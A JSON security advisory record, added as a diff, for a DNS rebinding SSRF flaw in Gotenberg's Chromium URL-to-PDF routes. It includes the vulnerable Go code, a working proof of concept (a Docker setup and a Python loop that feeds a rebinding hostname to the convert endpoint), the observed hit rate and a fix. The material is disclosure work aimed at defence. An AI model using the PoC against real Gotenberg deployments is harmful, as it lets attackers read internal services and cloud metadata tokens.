@@ -1,0 +1,45 @@
+{
+  "id": "GHSA-2pmr-289p-44r3",
+  "modified": "2026-05-07T01:20:52.298825Z",
+  "published": "2026-05-07T00:57:37Z",
+  "aliases": [
+    "CVE-2026-42592"
+  ],
+  "summary": "Gotenberg's DNS rebinding bypasses SSRF validation on Chromium URL conversion routes",
+  "details": "## Summary\n\n`FilterOutboundURL` resolves the hostname, checks the resolved IPs against the private-address deny-list, and returns only the error. It discards the resolved addresses. Chromium later performs its own DNS resolution when it navigates to the URL. An attacker who controls DNS for a hostname with a short TTL returns a public IP on the first query (Gotenberg allows) and a private IP on the second query (Chromium connects to the attacker-chosen internal address). The CDP `Fetch.requestPaused` handler re-checks the URL but runs its own DNS resolution, leaving a timing window before Chromium's actual TCP connect. The rendered internal service response returns to the caller as a PDF.\n\n## Details\n\n`pkg/gotenberg/outbound.go:227-230` drops the pinned IPs from the outbound decision:\n\n```go\nfunc FilterOutboundURL(ctx context.Context, rawURL string, allowList, denyList []*regexp2.Regexp, deadline time.Time) error {\n    _, err := decideOutbound(ctx, rawURL, allowList, denyList, deadline)\n    return err\n}\n```\n\nThe Chromium convert path at `pkg/modules/chromium/browser.go:341` calls `FilterOutboundURL(ctx, url, b.arguments.allowList, b.arguments.denyList, deadline)` and, on success, hands the raw URL string to Chromium via CDP. Chromium's network stack issues its own DNS lookup for the hostname, independent of Go's resolver.\n\nThe CDP `Fetch.requestPaused` listener at `pkg/modules/chromium/events.go:55` runs a second check:\n\n```go\nerr := gotenberg.FilterOutboundURL(ctx, e.Request.URL, options.allowList, options.denyList, deadline)\n```\n\nThis also calls `decideOutbound`, which again resolves DNS, checks, and returns only the error. After the handler calls `fetch.ContinueRequest` at line 101, Chromium proceeds to the actual TCP connect and resolves DNS one more time. Between the second check and the connect, the DNS answer can change.\n\nThe webhook and downloadFrom paths avoid this class by using `gotenberg.NewOutboundHttpClient` at `pkg/gotenberg/outbound.go:269-280`, which wires a `secureDialContext` that pins resolved IPs through `dialPinned`. The Chromium navigation path has no equivalent. The `--chromium-host-resolver-rules` flag at `pkg/modules/chromium/chromium.go:446` defaults to empty, so no operator-provided mapping closes the gap in default deployments.\n\n## Proof of Concept\n\nReproduction uses a public DNS service that randomizes the response per query. `rebind.\u003csubdomain\u003e.requestrepo.com` resolves to `\u003cpublic-ip\u003e` or `127.0.0.1` with 50/50 probability per lookup. The attacker selects a subdomain and configures it to return `\u003cpublic-ip\u003e%127.0.0.1`.\n\nSetup:\n\n```bash\ndocker run -d --name gotenberg-poc -p 3000:3000 gotenberg/gotenberg:8\n\n# Simulate an internal-only HTTP service that the default deny-list blocks.\ndocker exec gotenberg-poc sh -c \\\n    'mkdir -p /tmp/rebind_srv \u0026\u0026 \\\n     echo \"\u003ch1\u003eINTERNAL-ONLY-REBIND-HIT\u003c/h1\u003e\" \u003e /tmp/rebind_srv/index.html'\ndocker exec -d gotenberg-poc sh -c \\\n    'cd /tmp/rebind_srv \u0026\u0026 python3 -m http.server 80 --bind 127.0.0.1'\n```\n\nAlice runs the attack without auth:\n\n```python\nimport requests, subprocess\nT = \"http://localhost:3000\"\nREBIND = \"http://rebind.\u003csubdomain\u003e.requestrepo.com/\"\nMARKER = \"INTERNAL-ONLY-REBIND-HIT\"\n\nhits = 0\nfor i in range(20):\n    r = requests.post(\n        f\"{T}/forms/chromium/convert/url\",\n        files={\"url\": (None, REBIND)},\n        timeout=30,\n    )\n    if r.status_code != 200:\n        continue\n    open(\"/tmp/_r.pdf\", \"wb\").write(r.content)\n    txt = subprocess.run(\n        [\"pdftotext\", \"/tmp/_r.pdf\", \"-\"],\n        capture_output=True, text=True,\n    ).stdout\n    if MARKER in txt:\n        hits += 1\n\nprint(f\"{hits}/20 rebind hits\")\n```\n\nObserved output against gotenberg 8.31.0:\n\n```\n2/20 rebind hits\n```\n\nThe marker renders in the attacker's PDF output. `127.0.0.1:80` serves that byte pattern only inside the container; the public IP the rebind service alternates with serves unrelated content. The attacker confirms the TCP connect reached loopback, not the public IP. Ten percent per-attempt success rate, trivially automated.\n\n## Impact\n\nAn unauthenticated caller reaches HTTP services bound to the Gotenberg container's loopback interface, cloud metadata endpoints at `169.254.169.254`, and services on other private-network addresses. Gotenberg's deny-list blocks direct URL access to these ranges; DNS rebinding sidesteps the block. The rendered response returns as PDF output, letting the attacker read metadata tokens, internal admin interfaces, or sidecar service state depending on what the deployment runs on loopback. The attack requires controlling the DNS authority for one hostname, which is within an Internet attacker's normal capability. Each attempt succeeds about one time in ten; a handful of requests per target is enough.\n\n## Recommended Fix\n\nPin the resolved IP from Gotenberg's `decideOutbound` check all the way to Chromium's connect. Export the existing `decideOutbound` function as `DecideOutbound`, then use the returned pinned IP to rewrite the Chromium navigation URL inside the `Fetch.requestPaused` handler via `fetch.ContinueRequest`. Set the `Host` header to the original hostname so TLS and virtual-host routing still work:\n\n```go\ndecision, err := gotenberg.DecideOutbound(ctx, e.Request.URL, options.allowList, options.denyList, deadline)\nif err != nil {\n    allow = false\n} else if len(decision.Pinned) \u003e 0 {\n    pinnedURL := rewriteHost(e.Request.URL, decision.Pinned[0].String())\n    req := fetch.ContinueRequest(e.RequestID).WithURL(pinnedURL).WithHeaders(...)\n}\n```\n\nAlternative: pass `--host-resolver-rules=\"MAP \u003chostname\u003e \u003cpinned-ip\u003e\"` to Chromium when starting the per-request session, derived from the `FilterOutboundURL` resolution. This is the same mechanism the `--chromium-host-resolver-rules` flag already exposes to operators, just applied automatically per request.\n\n---\n*Found by [aisafe.io](https://aisafe.io)*",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/gotenberg/gotenberg/v8",
+        "purl": "pkg:golang/github.com/gotenberg/gotenberg/v8"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "last_affected": "8.31.0"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-2pmr-289p-44r3/GHSA-2pmr-289p-44r3.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/gotenberg/gotenberg/security/advisories/GHSA-2pmr-289p-44r3"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/gotenberg/gotenberg"
+    }
+  ]
+}
